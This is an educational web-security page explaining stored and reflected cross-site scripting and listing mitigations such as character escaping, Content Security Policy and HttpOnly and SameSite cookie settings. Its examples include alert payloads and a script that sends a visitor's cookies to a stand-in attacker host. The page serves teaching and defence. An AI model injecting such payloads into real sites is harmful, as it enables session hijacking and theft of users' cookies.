---
title: "XSS (Cross-Site Scripting)"
draft: false
weight: 999
---

Cross-site scripting is a form of cyber-attack where the attacker tricks a user into executing a malicious script.
The attacks can lead to the disclosure of the user's cookie information or manipulation of the web page content.

## Stored XSS Attacks

Stored XSS attacks occur when the attacker storing a malicious JavaScript on the target website.
This malicious input is saved into the website’s database and is executed when other users access the website.

For instance, in a chat application, an attacker could post the following:

```html
<script>alert("Hacked!");</script>
```

If the website does not properly escape or sanitize the input, any user who accesses the chat application and views the attacker's post will inadvertently execute this script.
While an alert may seem harmless, attackers could execute scripts like the following to send a user's cookies to the attacker:

```html
<script>
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://attacker.example.com/steal-data", true);
  xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
  xhr.send("cookie=" + document.cookie);
</script>
```

## Reflected XSS Attacks

Reflected XSS attacks are different from stored XSS attacks in that the malicious script is not stored on the target website.
Its impact is generally more limited than stored XSS.

As an example, an attacker might send phishing emails or messages with a link like this:

```html
https://victim.example.com/search?q=<script>alert('Hacked!');</script>
```

If the target website doesn't properly handle parameters, the script might be executed.
Just like with stored XSS, the script executed is not limited to displaying an alert.
There are various techniques, such as embedding the target site inside an iframe on a fake website to steal session IDs or altering forms to send information to the attacker.

## Mitigations

The main cause of XSS vulnerabilities is a failure to escape special characters during HTML rendering.
As a fundamental measure, it is necessary to systematically escape special characters within element content and attribute values, as shown in the table below:

| Special Character | Escape Code |
| ----------------- | ----------- |
| <                 | `&lt;`      |
| >                 | `&gt;`      |
| &                 | `&amp;`     |
| "                 | `&quot;`    |
| '                 | `&#39;`     |

Additionally, the following measures are recommended:

- Returning response headers that enable XSS filters through web server configuration.
  - Content Security Policy (CSP): A security policy controlled through server response headers, restricting external content loading and script execution.
  - X-XSS-Protection: This is now deprecated as different or older browsers have varied implementations or lack support, CSP is recommended.
- Sanitizing input values (e.g., allow only numbers, letters, character limits).
- Thoughtful cookie settings:
  - HttpOnly: Setting that prevents JavaScript from reading cookies.
  - SameSite: Setting that prevents cookies from being read through requests from different domains. Since there are different types of restrictions, it's necessary to choose the appropriate setting when using it.

## References

- 徳丸 浩、「体系的に学ぶ 安全なWebアプリケーションの作り方 第2版」
